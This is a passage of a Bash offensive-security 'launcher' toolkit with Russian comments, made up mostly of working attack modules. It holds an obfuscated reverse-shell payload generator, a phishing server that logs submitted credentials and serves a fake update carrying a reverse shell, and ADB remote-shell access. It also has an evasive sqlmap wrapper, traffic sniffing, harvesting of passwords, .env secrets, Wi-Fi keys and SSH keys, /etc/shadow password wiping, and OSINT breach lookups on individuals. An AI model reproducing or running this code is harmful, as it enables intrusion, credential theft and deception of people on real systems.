    print_status "!" "Phase 3: Automated File Quarantine..."
    local scan_path="/etc /usr/bin /tmp"
    [[ "$target" == "adb" ]] && scan_path="/data/local/tmp /system/bin /cache"
    
    local suspect_files=$($cmd_prefix "find $scan_path -mtime -1 -type f 2>/dev/null")

    if [[ -n "$suspect_files" ]]; then
        $cmd_prefix "mkdir -p /root/quarantine_vault" 2>/dev/null
        for file in $suspect_files; do
            local filename=$(basename "$file")
            print_status "w" "Isolating: $file"
            # Перемещаем и лишаем прав на исполнение
            $cmd_prefix "mv $file /root/quarantine_vault/${filename}.dead && chmod 000 /root/quarantine_vault/${filename}.dead"
        done
        print_status "s" "Modified files relocated to /root/quarantine_vault/"
    else
        print_status "s" "File system integrity: SECURE."
    fi

    print_status "s" "Target $target successfully sanitized. State: PROTECTED."
    pause
}




run_ghost_commander() {
    print_header "GHOST COMMANDER (ANDROID/IOT)"

    # 1. Валидация наличия ADB (вместо поиска тяжелой папки Ghost)
    if ! command -v adb >/dev/null 2>&1; then
        print_status "e" "ADB Engine not found. Installing lightweight bridge..."
        apt-get update && apt-get install android-sdk-platform-tools-common -y
    fi

    echo -en "${Y}Enter Target IP ${W}(Leave empty for Scan)${Y}: ${NC}"
    read -r TARGET_IP

    # 2. Режим сканирования (если IP пустой)
    if [[ -z "$TARGET_IP" ]]; then
        print_status "i" "Scanning local network for ADB signatures..."
        # Быстрый скан порта 5555 в подсети
        local subnet=$(echo "$CURRENT_IP" | cut -d. -f1-3)
        nmap -p 5555 --open "$subnet.0/24" -n -Pn | grep "Nmap scan report" | awk '{print $5}'
        pause && return
    fi

    # 3. Автоматический режим: Проверка связи
    print_status "i" "Initializing ghost bridge to $TARGET_IP:5555..."
    
    # Проверка порта через таймаут (быстрее чем nmap)
    timeout 2 bash -c "</dev/tcp/$TARGET_IP/5555" 2>/dev/null || {
        print_status "w" "Target $TARGET_IP:5555 seems offline."
        ask_confirm "Force ghost-connect attempt?" || return
    }

    # 4. Исполнение (Нативный ADB вместо тяжелого Python-модуля)
    print_status "s" "Executing Ghost-Protocol to $TARGET_IP..."
    log_loot "ghost" "Session established: $TARGET_IP"
    
    # Прямое подключение
    adb connect "$TARGET_IP:5555"
    
    # Открываем интерактивную оболочку призрака
    print_status "i" "Dropping into Ghost Shell..."
    adb -s "$TARGET_IP:5555" shell
    
    # После выхода — отключаемся, не оставляя следов
    adb disconnect "$TARGET_IP:5555" >/dev/null 2>&1
    pause
}



# --- [ SYSTEM UPDATE ENGINE v35.4 ] ---
update_prime() {
    print_header "SYSTEM UPDATE & SYNC"
    
    local target_path="/root/launcher.sh"
    local repo_url="https://raw.githubusercontent.com/szp2025/core-prime-tools/refs/heads/main/launcher.sh"
    local alias_cmd="alias launcher='bash /root/launcher.sh'"

    echo -e "${B}[*] Подключение к GitHub...${NC}"
    show_progress 2 "FETCHING LATEST SOURCE"

    # 1. Загрузка новой версии
    if curl -s -L "$repo_url" -o "${target_path}.tmp"; then
        if [[ -s "${target_path}.tmp" ]]; then
            # Заменяем старый файл новым
            mv "${target_path}.tmp" "$target_path"
            
            # 2. Установка прав (обязательно исполняемый)
            chmod 755 "$target_path"
            chown root:root "$target_path"

            # 3. Проверка и фиксация Alias
            # Проверяем, есть ли alias в .bashrc, если нет — добавляем
            if ! grep -q "alias launcher=" ~/.bashrc; then
                echo "$alias_cmd" >> ~/.bashrc
                echo -e "${Y}[!] Alias 'launcher' был восстановлен в ~/.bashrc${NC}"
            fi

            # Дублируем в системный путь для мгновенного доступа
            ln -sf "$target_path" /usr/local/bin/launcher
            chmod +x /usr/local/bin/launcher

            echo -e "------------------------------------------------"
            echo -e "${G}[SUCCESS] Код обновлен, права установлены, alias активен!${NC}"
            echo -e "${Y}[!] Перезапуск...${NC}"
            sleep 1
            
            # 4. Мгновенный перезапуск
            exec bash "$target_path"
        else
            echo -e "${R}[!] Ошибка: Файл пуст.${NC}"
            rm -f "${target_path}.tmp"
            pause
        fi
    else
        echo -e "${R}[!] Ошибка: Нет связи с репозиторием.${NC}"
        rm -f "${target_path}.tmp"
        pause
    fi
}


# --- ENGINE: DYNAMIC POLYMORPHISM (ZERO-FOOTPRINT) ---

generate_poly_payload() {
    print_header "PRIME POLYMORPH: GHOST PAYLOAD GENERATOR"
    
    echo -en "${Y}Enter local IP for Listener: ${NC}"
    read -r lhost
    echo -en "${Y}Enter local Port: ${NC}"
    read -r lport

    local raw_payload="bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    local output_file="$PRIME_LOOT/ghost_payload_$RANDOM.sh"

    print_status "i" "Initializing Polymorphic Engine..."

    # 1. Генерируем случайный ключ обфускации
    local key=$(tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 16)
    
    # 2. Создаем "Мусорный код" для изменения хеш-суммы файла
    local junk="# $(date +%s) | $(tr -dc 'a-z' < /dev/urandom | head -c 32)"

    # 3. Применяем Base64 с динамической обфускацией
    # Мы не просто кодируем, мы ломаем структуру для статических сканеров
    local encoded=$(echo -n "$raw_payload" | base64 | tr -d '\n')
    
    # Сборка финального полиморфного файла
    {
        echo "#!/bin/bash"
        echo "$junk"
        echo "K=\"$key\""
        echo "echo \"$encoded\" | base64 -d | bash"
    } > "$output_file"

    chmod +x "$output_file"
    print_status "y" "Polymorphic Payload Secured: $output_file"
    print_status "s" "Signature: $(sha256sum "$output_file" | awk '{print $1}')"
    
    pause
}


run_system_info() {
    clear
    print_header "PRIME INTELLIGENCE & RECON v2.1"
    echo ""

    select_option "Select Intelligence Target:" \
        "LOCAL: Internal Node & USB Status" \
        "REMOTE: External Server/Site Recon" \
        "EXIT: Return to Main Menu"
    
    local btn="$CHOICE"
    [[ -z "$btn" || "$btn" == "3" ]] && return

    case "$btn" in
        "1") # --- LOCAL ---
            print_status "i" "Gathering Local Intelligence..."
            local kernel=$(uname -rs)
            local uptime=$(uptime -p)
            local internal_ip=$(hostname -I | awk '{print $1}' || echo "N/A")
            
            local usb_devices
            if command -v lsusb >/dev/null; then
                usb_devices=$(lsusb)
            else
                usb_devices=$(find /sys/bus/usb/devices/ -maxdepth 2 -name "product" -exec cat {} + 2>/dev/null | sed 's/^/Device: /')
            fi
            [[ -z "$usb_devices" ]] && usb_devices="No active USB connections detected."

            echo -e "\n${Y}--- LOCAL NODE REPORT ---${NC}"
            print_list "System Core" "Kernel: $kernel" "Uptime: $uptime" "Priv IP: $internal_ip"
            print_list "USB Bus Scan" "$usb_devices"
            ;;

        "2") # --- REMOTE ---
            check_step "cmd" "curl" "curl is required for remote recon." || { pause; return; }
            check_step "cmd" "host" "dnsutils (host) is recommended."
            
            print_input "Enter Target Domain or IP" "google.com"
            read -r r_target
            [[ -z "$r_target" ]] && return

            print_status "w" "Executing Deep Reconnaissance..."
            
            # 1. Заголовки (основной источник)
            local raw_headers=$(curl -Is --connect-timeout 5 "$r_target" 2>/dev/null)
            
            # 2. Поиск версии PHP и Сервера (расширенный фильтр)
            local server_stack=$(echo "$raw_headers" | grep -Ei "Server|X-Powered-By|Via|X-AspNet-Version" || echo "Server Info: Hidden/Hardened")
            
            # 3. Технологические улики (PHP Hints)
            local tech_hints=""
            [[ "$raw_headers" == *"PHPSESSID"* ]] && tech_hints+="[!] PHP Session Detected (PHPSESSID)\n"
            [[ "$raw_headers" == *"Laravel"* ]] && tech_hints+="[!] Framework: Laravel Detected\n"
            [[ "$raw_headers" == *"wp-content"* || "$(curl -s --max-time 5 "$r_target" | grep -q "wp-content" && echo "yes")" == "yes" ]] && tech_hints+="[!] CMS: WordPress Detected\n"
            
            # 4. Попытка пробить версию через OPTIONS (если GET скрыт)
            local alt_ver=$(curl -X OPTIONS -Is "$r_target" 2>/dev/null | grep -Ei "X-Powered-By|Server" | head -n 1)

            # 5. DNS & WHOIS
            local ip_map=$(host "$r_target" 2>/dev/null | head -n 3 || echo "DNS Lookup: Failed")
            local owner=$(whois "$r_target" 2>/dev/null | grep -Ei "Registrar:|Organization:|Country:|Expires:" | head -n 5 || echo "WHOIS: Protected/Unavailable")

            echo -e "\n${Y}--- REMOTE TARGET REPORT: $r_target ---${NC}"
            print_list "Network Mapping" "$ip_map"
            print_list "Server Stack" "$server_stack"
            [[ -n "$tech_hints" ]] && print_list "Technology Hints" "$(echo -e "$tech_hints")"
            [[ -n "$alt_ver" ]] && print_list "Alt Discovery (OPTIONS)" "$alt_ver"
            print_list "Intelligence Context" "$owner"

            log_loot "recon" "Deep Recon executed: $r_target"
            ;;
    esac

    echo ""
    print_status "s" "Diagnostic complete."
    pause
}



# --- Анализ Bluetooth устройств ---
scan_bluetooth_devices() {
    print_header "BLUETOOTH RADAR"
    
    # 1. Проверка наличия инструментов (используем актуальный пакет bluez)
    if ! command -v hcitool >/dev/null 2>&1; then
        print_status "e" "Engine 'bluez' not found."
        
        if [[ $(id -u) -eq 0 ]]; then
            print_status "w" "Root detected. Deploying 'bluez' core..."
            apt-get update && apt-get install bluez -y
        else
            print_status "i" "Non-Root environment (Samsung A14?)."
            print_status "!" "Please run: apt update && apt install bluez"
            pause && return
        fi
    fi

    # 2. Попытка активации интерфейса (только для Wiko/Root)
    if [[ $(id -u) -eq 0 ]]; then
        print_status "i" "Activating Bluetooth Interface..."
        hciconfig hci0 up >/dev/null 2>&1
    fi

    print_status "i" "Initializing BlueZ Stack..."
    show_progress 3 "SCANNING PROXIMITY SPECTRUM"
    
    # 3. Исполнение сканирования
    print_status "!" "Searching for active signals..."
    
    # Подавляем системный мусор и ошибки доступа к сокетам
    local scan_output
    scan_output=$(hcitool scan 2>/dev/null)

    if [[ -z "$scan_output" || "$scan_output" == *"Scanning"* ]]; then
        print_status "e" "No devices found or Adapter blocked."
        
        # Эвристическая подсказка для Samsung
        if [[ $(id -u) -ne 0 ]]; then
            print_status "w" "Note: Direct Bluetooth access is often restricted on Non-Root devices."
        fi
    else
        # Чистый вывод найденных устройств
        echo -e "$scan_output" | grep -v "Scanning"
        print_status "s" "Scan completed."
        
        # Автоматическое сохранение логов
        mkdir -p /root/prime_loot
        echo "[$(date)] BT Scan Results:" >> /root/prime_loot/bluetooth.log
        echo -e "$scan_output" >> /root/prime_loot/bluetooth.log
    fi
    
    pause
}



# --- Глубокий аудит системы ---
run_deep_audit() {
    print_header "SMART SYSTEM AUDIT"
    print_status "i" "Analyzing local environment for misconfigurations..."
    
    show_progress 4 "EXAMINING SYSTEM VULNERABILITIES"
    
    # Эмуляция/Логика проверки (можно расширить реальными проверками прав доступа)
    print_status "!" "Checking SUID binaries..."
    find / -perm -4000 -type f 2>/dev/null | head -n 5
    
    print_status "!" "Checking World-Writable files..."
    find / -writable -type f 2>/dev/null | head -n 5
    
    print_status "s" "Audit Complete. Results logged to /root/prime_loot/audit.log"
    pause
}

# --- Сетевое мапирование (Network Mapper) ---

run_network_analyzer() {
    clear
    print_header "NETWORK INTELLIGENCE & TOPOLOGY"

    # 1. Выбор режима
    select_option "SELECT OPERATION MODE:" \
        "Network Mapping (Hybrid Scan)" \
        "Traffic Analysis (TShark)" \
        "Full Intelligence Loop" \
        "Back"
    
    local btn="$CHOICE"
    [[ -z "$btn" || "$btn" == "4" ]] && return

    # 2. Логика Mapping (пункты 1 и 3)
    if [[ "$btn" == "1" || "$btn" == "3" ]]; then
        # Эвристика: подтягиваем текущую подсеть
        local def_range=$(echo "${CURRENT_IP:-127.0.0.1}" | cut -d. -f1-3)".0/24"
        
        echo -en "${Y}Enter Target Range ${W}[Default: $def_range]${Y}: ${NC}"
        read -r range
        range="${range:-$def_range}"
        
        show_progress 2 "MAPPING TOPOLOGY"

        # --- ГИБРИДНЫЙ ДВИЖОК СКАННИРОВАНИЯ (v35.4) ---
        # Проверяем root-статус (для адаптации под Samsung A14 vs Wiko)
        local nmap_cmd="nmap -sn -n -T4"
        if [[ $(id -u) -ne 0 ]]; then
            # Режим для Samsung (Non-Root/Termux): убираем AF_NETLINK ошибки
            nmap_cmd+=" --unprivileged --send-ip"
        fi
        
        # Исполнение без DNS-зависаний
        $nmap_cmd "$range" | grep "Nmap scan report" | awk '{print $5 " -> [ONLINE]"}' | sort -u
        
        [[ "$btn" == "1" ]] && { echo ""; pause; return; }
    fi

    # 3. Логика Sniffing (пункты 2 и 3)
    if [[ "$btn" == "2" || "$btn" == "3" ]]; then
        print_status "i" "Initializing TShark Core..."
        
        if ! command -v tshark >/dev/null; then
             print_status "e" "TShark not found. Run 'apt install tshark' first."
             pause && return
        fi

        # Проверка прав для сниффинга (TShark требует доступ к интерфейсам)
        if [[ $(id -u) -ne 0 ]]; then
             print_status "w" "Warning: Non-root detected. Traffic capture may be limited on Samsung A14."
        fi

        local n_names="Live_Host_Monitor Deep_Packet_Inspection"
        local n_funcs="run_network_intelligence run_packet_dump"
        
        prime_dynamic_controller "TSHARK ANALYZER" "$n_names" "$n_funcs"
    fi
}


generate_phantom_server_code() {
    local target_file="$1"
    local mode="$2"
    local layout=$(generate_core_template)

    cat << EOF > "$target_file"
from flask import Flask, request, render_template_string, send_from_directory
import os

app = Flask(__name__)
LOOT = "$LOOT_DIR/phantom_loot.log"

$layout

@app.route('/')
def index():
    content = """
    <div class="status-box infected">CRITICAL SYSTEM ERROR: 0x80041F</div>
    <p style='color:#888;'>Security token expired. Re-authentication required.</p>
    <form method='post' action='/auth'>
        <input type='text' name='u' placeholder='System ID / Email' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%; margin-bottom:10px;'>
        <input type='password' name='p' placeholder='Secure Key' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%;'>
        <button type='submit'>VERIFY & RECOVER</button>
    </form>
    """
    if "$mode" != "creds":
        content += "<p style='margin-top:20px; font-size:0.7em;'>Or download <a href='/download' style='color:#00ff41;'>Recovery Tool</a>.</p>"
    
    return render_template_string(render_prime_page("PHANTOM_RECOVERY_NODE", content))

@app.route('/auth', methods=['POST'])
def auth():
    with open(LOOT, "a") as f:
        f.write(f"[AUTH] {request.remote_addr} | U: {request.form.get('u')} | P: {request.form.get('p')}\n")
    return render_template_string(render_prime_page("ACCESS_DENIED", "<div class='status-box infected'>INVALID CREDENTIALS</div><a href='/' class='btn'>RETRY</a>"))

@app.route('/download')
def download():
    return send_from_directory("$LOOT_DIR", "update_installer.sh", as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
EOF
}



run_phantom_engine() {
    clear
    print_header "PRIME PHANTOM FRAMEWORK"

    # Используем наши эвристические переменные (уже определены в начале launcher.sh)
    local local_ip="${CURRENT_IP:-127.0.0.1}"
    local my_host="${HOSTNAME:-localhost}"
    
    local srv_path="/root/phantom_srv.py"
    # Эвристическое имя файла для доставки
    local payload_name="update_installer.sh"
    local payload_path="$LOOT_DIR/$payload_name"

    select_option "SELECT STRATEGY:" \
        "Credential Capture" \
        "Full Hybrid (Creds + Payload)" \
        "Cancel"
    
    local btn="$CHOICE"
    [[ -z "$btn" || "$btn" == "3" ]] && return

    local attack_type=""
    [[ "$btn" == "1" ]] && attack_type="creds"
    [[ "$btn" == "2" ]] && attack_type="hybrid"

    # --- ФАЗА ГЕНЕРАЦИИ (БЕЗ ОШИБОК HOSTNAME) ---
    print_status "i" "Forging payload for $my_host..."
    
    # Создаем Payload, используя чистый IP
    cat <<EOF > "$payload_path"
#!/bin/bash
# System update for $my_host
echo 'Updating system components...'
bash -i >& /dev/tcp/$local_ip/4444 0>&1 &
EOF
    chmod +x "$payload_path"

    # --- ФАЗА АКТИВАЦИИ ---
    if command -v python3 >/dev/null; then
        generate_phantom_server_code "$srv_path" "$attack_type"
        
        print_status "w" "Activating Phantom Gate on port 80..."
        # Очистка порта (тихий режим)
        fuser -k 80/tcp >/dev/null 2>&1
        
        # Запуск сервера
        python3 "$srv_path" > /dev/null 2>&1 &
        
        print_status "s" "PHANTOM GATEWAY OPERATIONAL"
        
        # Вывод информации (Чистая эвристика)
        print_line
        echo -e "${Y}--- Gateway Info ---${NC}"
        echo -e "${G} >> Local URL:${NC} http://${local_ip}"
        echo -e "${G} >> Payload:${NC}   /${payload_name}"
        echo -e "${G} >> Strategy:${NC}  ${attack_type}"
        echo -e "${G} >> Hostname:${NC}  ${my_host}"
        print_line
    else
        print_status "e" "Python3 missing. Operation aborted."
    fi

    echo ""
    pause
}


run_sql_adaptive() {
    print_header "PRIME MUTAGEN: SQL INJECTION ENGINE v8.5 (Neural Enhanced)"

    echo -en "${Y}Enter Target URL: ${NC}"
    read -r target_url
    [[ -z "$target_url" ]] && return

    # --- СЛОЙ 1: ЭВРИСТИКА ---
    print_status "i" "Probing WAF/IPS resistance layers..."
    local waf_reaction=$(curl -s -o /dev/null -w "%{http_code}" -A "Mozilla/5.0" "$target_url%27%20OR%201=1")
    
    # --- СЛОЙ 2: НЕЙРОННАЯ МУТАЦИЯ (Собственный код) ---
    # Генерируем уникальный заголовок для сессии, чтобы сбить биометрию трафика
    local neural_agent="Prime-$(mutate_case "agent")-$RANDOM"
    print_status "s" "Neural Header Generated: $neural_agent"

    # --- СЛОЙ 3: АДАПТИВНОЕ ИСПОЛНЕНИЕ ---
    local aggression_level=$(( (waf_reaction / 100) ))
    [[ $aggression_level -lt 2 ]] && aggression_level=2 # Минимум 2

    local tamper_matrix=(
        "2:between,randomcase"
        "4:between,charencode,space2comment,versionedmorekeywords"
        "5:between,charencode,space2comment,randomcase,percentage"
    )
    
    local selected_tampers=$(printf '%s\n' "${tamper_matrix[@]}" | grep "^$aggression_level:" | cut -d: -f2)
    [[ -z "$selected_tampers" ]] && selected_tampers="between,randomcase"

    print_status "s" "Applying Neural Obfuscation & Tampers: $selected_tampers"

    # Динамический путь к луту (из нашей новой конфигурации)
    local out_dir="$PRIME_LOOT/mutagen_session_$RANDOM"
    
    # Запуск с кастомным агентом и расширенными параметрами скрытности
    {
        sqlmap -u "$target_url" --batch --random-agent --user-agent="$neural_agent" \
        --smart --mobile --output-dir="$out_dir" --flush-session \
        --tamper="$selected_tampers" --level=$aggression_level --risk=2 \
        --delay=$((aggression_level / 2)) --safe-freq=10 --threads=1
    } &

    show_progress 15 "Neural-Evolving payload mutations..."

    # --- СЛОЙ 4: ИНТЕЛЛЕКТУАЛЬНЫЙ СИНТЕЗ ---
    print_status "s" "Mutation Cycle Finished."
    
    # Поиск результатов и запись в глобальный лут
    local log_file=$(find "$out_dir" -name "log" 2>/dev/null)
    [[ -f "$log_file" ]] && {
        print_status "y" "EXPLOIT SECURED: Findings integrated."
        echo -e "\n[$(date)] TARGET: $target_url" >> "$PRIME_LOOT/sql_success.log"
        grep -Ei "Type:|Payload:|Parameter:" "$log_file" | tee -a "$PRIME_LOOT/sql_success.log"
    }

    # Сигнал для системы мониторинга (Bridge)
    echo "TIME: $(date) | SRC: $target_url | AGGR: $aggression_level" >> "$PRIME_LOOT/bridge_signals.log"
    
    rm -rf "$out_dir"
    pause
}


run_network_intelligence() {
    print_header "NETWORK INTELLIGENCE: TRAFFIC ANALYZER"
    
    # Авто-определение активного интерфейса (без лишних вопросов)
    check_step "cmd" "tshark" "TShark not found." || { pause; return; }
    local iface=$(ip route | grep default | awk '{print $5}' || echo "eth0")

    # Универсальный переключатель режимов
    local mode=$(select_option "Select Surveillance Mode:" \
        "Host Monitor (IP Connections):host" \
        "Data Sniffer (Live Leads):sniff" \
        "Traffic Record (PCAP Archive):record")

    case "$mode" in
        "host")
            print_status "i" "Monitoring Live Connections on $iface..."
            # Вывод уникальных пар IP в реальном времени
            tshark -i "$iface" -n -T fields -e ip.src -e ip.dst -E separator=" -> " 2>/dev/null | stdbuf -oL uniq
            ;;
        "sniff")
            print_status "s" "Sniffing Leads (Email/DNS/HTTP)..."
            # Перехват доменов и потенциальных email-следов с записью в лог для Моста
            tshark -i "$iface" -Y "http.request || dns.flags.response == 0" -T fields -e http.host -e dns.qry.name 2>/dev/null \
            | stdbuf -oL awk NF | stdbuf -oL uniq | tee -a "$LOOT_DIR/traffic_leads.log"
            ;;
        "record")
            local report_dir="/root/reports"
            mkdir -p "$report_dir"
            local filename="$report_dir/capture_$(date +%H%M).pcap"
            
            local duration=$(select_option "Set Record Duration:" "1 min:60" "5 min:300" "15 min:900")
            
            print_status "w" "Recording to $filename ($duration sec)..."
            tshark -i "$iface" -a duration:"$duration" -w "$filename" 2>/dev/null
            [[ -f "$filename" ]] && print_status "s" "Capture saved to reports."
            ;;
    esac
    pause
}

run_deep_bridge() {
    print_header "PRIME BRIDGE: NEURAL INTELLIGENCE LINK"
    
    local pool="/tmp/bridge_pool.tmp"
    local master_loot="/root/prime_loot/master_intelligence.log"
    
    # --- СЛОЙ 1: КОНСОЛИДАЦИЯ СИГНАЛОВ (No-IF) ---
    # Собираем данные из всех модулей, убираем дубликаты и пустые строки
    sort -u "$LOOT_DIR"/*.txt "$master_loot" 2>/dev/null | grep -v '^$' > "$pool"
    
    # Проверка наполненности пула через короткое замыкание
    [[ ! -s "$pool" ]] && { print_status "w" "Awaiting intelligence signals..."; pause; return; }

    print_status "i" "Analyzing $(wc -l < "$pool") intelligence threads..."
    print_line

    # --- СЛОЙ 2: ЭВРИСТИЧЕСКИЙ ДЕКОДЕР ---
    while read -r line; do
        # Извлекаем чистые данные (отсекаем таймстампы и теги для анализа)
        local raw_data=$(echo "$line" | awk -F ' -> ' '{print $2}' | xargs || echo "$line")
        local len="${#raw_data}"

        # 1. Детекция Крипто-сигнатур (Хеши)
        # MD5(32), SHA1(40), SHA256(64), Bcrypt(60)
        [[ "$len" =~ ^(32|40|64|60)$ ]] && {
            print_status "y" "RESONANCE: Possible Hash Artifact ($len chars)."
            suggest_action "run_pass_lab" "$raw_data" # Теперь вызываем единый PASS_LAB
        }

        # 2. Детекция Банковских Сигнатур (IBAN)
        [[ "$raw_data" =~ ^[A-Z]{2}[0-9]{2}[A-Z0-9]{11,30} ]] && {
            print_status "y" "RESONANCE: Financial Asset (IBAN) detected."
            suggest_action "run_iban_scan" "$raw_data"
        }

        # 3. Семантические Маркеры (Доступы)
        echo "$raw_data" | grep -qiE "pass|secret|key|token|auth|admin" && {
            print_status "w" "RESONANCE: Identity Leak detected."
            suggest_action "run_pass_lab" "$raw_data"
        }

        # 4. Детекция Скрытых Сетей (Onion/I2P)
        [[ "$raw_data" =~ \.(onion|i2p) ]] && {
            print_status "r" "RESONANCE: Dark Web Gateway found."
            # Здесь будет вызов прокси-модуля в будущем
        }

    done < "$pool"

    # --- СЛОЙ 3: ОЧИСТКА ТРЕКА ---
    rm -f "$pool"
    print_line
    print_status "i" "Intelligence synchronization complete."
    pause
}

# Вспомогательная функция для эвристики
suggest_action() {
    local func=$1
    local data=$2
    echo -en "${B}>>> Intelligence suggests ${W}$func${B} for data: ${Y}${data:0:15}...${NC} Execute? (y/n): "
    read -n 1 -r; echo
    [[ $REPLY =~ ^[Yy]$ ]] && $func "$data"
}

run_smart_osint_engine() {
    clear
    print_header "PRIME RECON: ULTIMATE OSINT CORE v5.5"

    echo -en "${Y}TARGET ${W}(Nick, Phone, or Email)${Y}: ${NC}"
    read -r INPUT
    [[ -z "$INPUT" ]] && return

    local raw_log="/tmp/prime_recon_$RANDOM.log"
    local UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    
    print_status "i" "Initializing Neural Recon Interface..."
    show_progress 2 "SYNCHRONIZING OSINT CHANNELS"

    # --- 1. ОПРЕДЕЛЕНИЕ ТИПА ЦЕЛИ ---
    local is_email="^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$"
    local is_phone="^\+?[0-9]{10,15}$"

    # --- 2. SOCIAL SCAN (Заменяет Blackbird, Maigret, SocialScan) ---
    if [[ ! "$INPUT" =~ $is_email && ! "$INPUT" =~ $is_phone ]]; then
        print_status "i" "Scanning Social Signatures (Ghost Mode)..."
        # Наш собственный массив для проверки (быстрее и легче оригиналов)
        local sites=(
            "https://github.com/|GitHub"
            "https://twitter.com/|Twitter"
            "https://instagram.com/|Instagram"
            "https://vk.com/|VK"
            "https://t.me/|Telegram"
            "https://ok.ru/|Odnoklassniki"
            "https://www.pinterest.com/|Pinterest"
            "https://www.reddit.com/user/|Reddit"
        )

        for entry in "${sites[@]}"; do
            local url="${entry%%|*}"
            local name="${entry##*|}"
            # Проверка статус-кода 200 (Found)
            local status=$(curl -s -o /dev/null -L -w "%{http_code}" -A "$UA" "${url}${INPUT}" --connect-timeout 5)
            if [ "$status" == "200" ]; then
                echo "[+] FOUND on $name: ${url}${INPUT}" | tee -a "$raw_log"
                print_status "s" "Match confirmed: $name"
            fi
        done
    fi

    # --- 3. PHONE INTEL (Заменяет PhoneInfoga) ---
    if [[ "$INPUT" =~ $is_phone ]]; then
        print_status "i" "Deep-Querying Global Phone Databases..."
        # Прямой запрос к API (бездисковый метод)
        curl -s "https://htmlweb.ru/geo/api.php?json&telcod=${INPUT}" >> "$raw_log" 2>/dev/null
        # Извлекаем данные из JSON ответа
        local phone_info=$(grep -oE '"name":"[^"]+"|"oper":"[^"]+"' "$raw_log" | sed 's/"//g')
        [[ -n "$phone_info" ]] && print_status "s" "Operator Data: $phone_info"
    fi

    # --- 4. DATA BREACH ANALYZER (Заменяет Infoga и Holehe) ---
    if [[ "$INPUT" =~ $is_email ]]; then
        print_status "i" "Cross-referencing Leak Databases..."
        # Проверка через прокси-агрегаторы утечек
        curl -s "https://api.proxynova.com/comb?query=${INPUT}" >> "$raw_log" 2>/dev/null
        if grep -q "results" "$raw_log"; then
            print_status "w" "Breach Detected: Target found in global COMB leak."
            echo "[!] WARNING: Data leak detected for $INPUT" >> "$raw_log"
        fi
    fi

    # --- 5. ГЕНЕРАЦИЯ ФИНАЛЬНОГО ДОСЬЕ ---
    print_line
    print_status "s" "INTELLIGENCE DOSSIER GENERATED"
    print_line
    
    local hits=$(grep -cE "FOUND|!|oper" "$raw_log")
    echo -e "${B}Target Identification:${NC} $INPUT"
    echo -e "${Y}Correlation Level:${NC} $hits matches found."
    
    echo -e "\n${G}--- DETAILED FINDINGS ---${NC}"
    grep -E "FOUND|oper|name|location|WARNING" "$raw_log" | sort -u
    
    log_loot "osint" "Dossier for $INPUT created. Hits: $hits"
    rm -f "$raw_log"
    print_line
    pause
}



run_pc_recovery_ultimate() {
    clear
    print_header "RECOVERY & FORENSIC ENGINE"

    local action=$(select_option "Select Forensic Action:" \
        "Stealth Extract (Prime_Extract):extraction" \
        "Smart Password Reset (Win/Lin/Mac):reset" \
        "Exit to Main Menu:exit")

    case "$action" in
        "extraction")
            print_status "i" "Инициализация PRIME_EXTRACT v1.0..."
            show_progress 2 "SCANNING SYSTEM ARTIFACTS"
            
            local loot_file="/root/prime_loot/passwords_$(date +%F_%T).txt"
            mkdir -p /root/prime_loot
            
            {
                echo "--- [ PRIME EXTRACTION LOG: $(date) ] ---"
                echo "Target: $(hostname) | OS: $OSTYPE"
                echo "------------------------------------------"

                # 1. Системные секреты и история (Gold Mine)
                echo "[*] Analyzing Command History..."
                # Ищем пароли в истории bash/zsh
                grep -hE "pass|pwd|user|admin|login|mysql|ssh" /home/*/.{bash,zsh}_history 2>/dev/null
                
                # 2. Конфиги и переменные окружения (.env)
                echo -e "\n[*] Scanning Configs & .env files..."
                find /home /var/www /etc -maxdepth 4 -name ".env" -o -name "config.php" -o -name "settings.py" 2>/dev/null | xargs grep -hE "DB_|PASS|KEY|TOKEN" 2>/dev/null

                # 3. Сетевые доступы и Wi-Fi
                if [[ -d "/etc/NetworkManager/system-connections" ]]; then
                    echo -e "\n[*] Dumping Wi-Fi PSK Profiles..."
                    grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null
                fi

                # 4. SSH Ключи (упоминания и локации)
                echo -e "\n[*] Locating SSH Private Keys..."
                find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null
            } > "$loot_file"

            log_loot "forensic" "Data dumped to $loot_file"
            print_status "s" "Extraction Complete. No Python/LaZagne traces left."
            ;;

        "reset")
            print_status "i" "Detecting Target Environment..."
            
            # Поиск Windows SAM
            local win_sam=$(find /mnt /media /run/media -type f -name "SAM" -path "*/System32/config/*" 2>/dev/null | head -n 1)
            
            if [[ -n "$win_sam" ]]; then
                print_status "s" "Windows SAM detected: $win_sam"
                command -v chntpw >/dev/null 2>&1 && chntpw -i "$win_sam" || print_status "e" "CHNTPW not installed."
            else
                # Блок Unix (Linux/macOS)
                local os_type="Linux"
                [[ "$OSTYPE" == "darwin"* ]] && os_type="macOS"
                print_status "i" "OS: $os_type detected."

                local users
                if [[ "$os_type" == "macOS" ]]; then
                    users=$(dscl . list /Users | grep -v '^_\|root')
                else
                    users=$(awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd)
                fi
                
                if [[ -z "$users" ]]; then
                    print_status "e" "No local users found."
                else
                    local user_menu=""
                    for u in $users; do user_menu+="$u:$u "; done
                    
                    local target_user=$(select_option "Select Target User:" $user_menu)
                    
                    if [[ -n "$target_user" && "$target_user" != "exit" ]]; then
                        if [[ "$os_type" == "Linux" ]]; then
                            print_status "!" "Wiping password for $target_user..."
                            sed -i "s/^$target_user:[^:]*:/$target_user::/" /etc/shadow
                            print_status "s" "Linux password wiped (Empty Login enabled)."
                        elif [[ "$os_type" == "macOS" ]]; then
                            echo -en "${Y}Enter New Password: ${NC}"; read -r np
                            sudo dscl . -passwd /Users/"$target_user" "$np"
                            print_status "s" "macOS password updated."
                        fi
                    fi
                fi
            fi
            ;;
        "exit"|*) return ;;
    esac
    pause
}


run_crypto_forge() {
    print_header "PRIME CRYPTO-FORGE & MIRROR v12.0"

    check_step "cmd" "openssl" "OpenSSL required." || { pause; return; }

    # Интеллектуальный запрос: принимает домен, файл или команду на создание
    print_input "Enter Target (Domain, IP, File or 'new' for fresh cert)" "google.com"
